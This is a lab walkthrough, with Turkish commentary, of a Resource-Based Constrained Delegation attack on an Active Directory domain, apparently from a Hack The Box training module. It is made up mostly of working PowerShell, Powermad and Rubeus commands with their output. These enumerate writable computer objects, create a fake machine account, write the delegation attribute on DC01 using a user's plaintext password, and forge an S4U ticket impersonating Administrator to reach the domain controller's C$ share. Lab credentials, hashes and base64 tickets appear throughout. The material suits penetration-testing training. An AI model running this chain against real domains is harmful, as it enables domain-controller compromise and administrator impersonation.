# RBCD

## Requirements

1. SPN içeren bir nesne üzerinde kontrol sahibi olunmalıdır. Eğer bu mümkün değil ise sahte bir bilgisayar oluşturulabilir.
2. Hedef bilgisayardaki [msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity) niteliğini değiştirmek için bu bilgisayar üzerinde aşağıdaki ayrıcalıklardan herhangi birine sahip bir kullanıcı gereklidir:
    * GenericWrite
    * GenericAll
    * WriteProperty
    * WriteDacl

## Enumeration

```powershell title="Search-RBCD.ps1" linenums="1" hl_lines="1 7"
Import-Module "C:\Tools\PowerView.ps1"

$computers = Get-DomainComputer

$users = Get-DomainUser

$rights = "GenericWrite", "GenericAll", "WriteProperty", "WriteDacl"

foreach ($computer in $computers)
{
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    foreach ($user in $users)
    {
        $hasAccess = $acl | ? {$_.SecurityIdentifier -eq $user.objectsid} | % {($_.ActiveDirectoryRights -match ($rights -join "|"))}

        if ($hasAccess)
        {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```

```pwsh
PS C:\Users\htb-student> C:\Tools\Search-RBCD.ps1
```

```output title="Output"
carole.holmes has the required access rights on DC01
```

## Creating a Computer with [Powermad](https://github.com/Kevin-Robertson/Powermad)

!!! warning

    Eğer [ms-DS-MachineAccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota) değeri 0 ise (varsayılan 10) bilgisayar oluşturulamaz.

```pwsh
PS C:\Users\htb-student> Import-Module C:\Tools\Powermad.ps1
PS C:\Users\htb-student> New-MachineAccount -MachineAccount ATTACK -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

```output title="Output"
[+] Machine account ATTACK added
```

## Adding the Computer to the Target Trust List

!!! abstract

    Carole Holmes kullanıcısı hedef bilgisayar üzerinde [GenericWrite](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-9.0) ayrıcalığına sahiptir. Bu sayede sahte bilgisayar hedef bilgisayarın güven listesine eklenebilir.

```pwsh
PS C:\Users\htb-student> Import-Module C:\Tools\PowerView.ps1
PS C:\Users\htb-student> $computerSID = Get-DomainComputer ATTACK -Properties objectsid | Select-Object -ExpandProperty objectsid
PS C:\Users\htb-student> $securityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($computerSID))"
PS C:\Users\htb-student> $securityDescriptorBytes = New-Object byte[] ($securityDescriptor.BinaryLength)
PS C:\Users\htb-student> $securityDescriptor.GetBinaryForm($securityDescriptorBytes, 0)
PS C:\Users\htb-student> $cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force))
PS C:\Users\htb-student> Get-DomainComputer DC01 | Set-DomainObject -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$securityDescriptorBytes} -Credential $cred -Verbose
```

## Getting the Computer Hashes

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe hash /domain:INLANEFREIGHT.LOCAL /user:ATTACK$ /password:Password123!
```

```output title="Output" hl_lines="5"
[*] Input password             : Password123!
[*] Input username             : ATTACK$
[*] Input domain               : INLANEFREIGHT.LOCAL
[*] Salt                       : INLANEFREIGHT.LOCALhostattack.inlanefreight.local
[*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
[*]       aes128_cts_hmac_sha1 : EB4FF07BC1DE03EA82F8BAA7731FB92B
[*]       aes256_cts_hmac_sha1 : A1940927D59C9C3B0B6F771E1608280BAC99B5E03F45414908C76184338AA169
[*]       des_cbc_md5          : 61C8438F0D67F16B
```

## Requesting a TGS Ticket

!!! abstract

    * TGT talep edilerek ATTACK$ kapsamına girildi.
    * Administrator adına [forwardable](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_4c6cd79b-120d-4ee1-ab24-d1b000e0b3ca) bir TGS bileti almak için S4U2self isteği yapıldı.
    * [SPN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names) değeri güncellendi.
    * Elde edilen TGS bileti kullanılarak S4U2proxy isteği yapıldı.

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe s4u /ptt /user:ATTACK$ /impersonateuser:Administrator /msdsspn:cifs/DC01.INLANEFREIGHT.LOCAL /altservice:cifs /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE
```

```output title="Output" hl_lines="4 38 42 72 74"
[*] Action: S4U

[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\ATTACK$'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      dBsTSU5MQU5FRlJFSUdIVC5MT0NBTA==


[*] Action: S4U

[*] Building S4U2self request for: 'ATTACK$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2self request to 172.16.99.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'ATTACK$@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):

      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
      T0NBTKkUMBKgAwIBAaELMAkbB0FUVEFDSyQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/DC01.INLANEFREIGHT.LOCAL'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'cifs/DC01.INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2proxy request to domain controller 172.16.99.3:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/DC01.INLANEFREIGHT.LOCAL':

      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
[+] Ticket successfully imported!
```

## Verifying the Ticket

```pwsh
PS C:\Users\htb-student> klist
```

```output title="Output" hl_lines="5-6 8"
Current LogonId is 0:0x4b751

Cached Tickets: (1)

#0>     Client: Administrator @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 5/2/2025 13:43:09 (local)
        End Time:   5/2/2025 23:43:09 (local)
        Renew Time: 5/9/2025 13:43:09 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

## Listing Directory Contents

```pwsh
PS C:\Users\htb-student> dir \\DC01.INLANEFREIGHT.LOCAL\C$
```

```output title="Output"
    Directory: \\DC01.INLANEFREIGHT.LOCAL\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/3/2023   2:58 PM                carole.holmes
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        10/6/2021   3:50 PM                Program Files
d-----        4/12/2023   3:24 PM                Program Files (x86)
d-----        3/30/2023  11:08 AM                Shares
d-----         4/4/2023   1:49 PM                Tools
d-----        3/30/2023   3:13 PM                Unconstrained
d-r---         4/4/2023  11:34 AM                Users
d-----       10/14/2022   6:49 AM                Windows
```

## Cleaning Up

```pwsh
PS C:\Users\htb-student> Import-Module C:\Tools\PowerView.ps1
PS C:\Users\htb-student> $cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force))
PS C:\Users\htb-student> Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $cred -Verbose
```
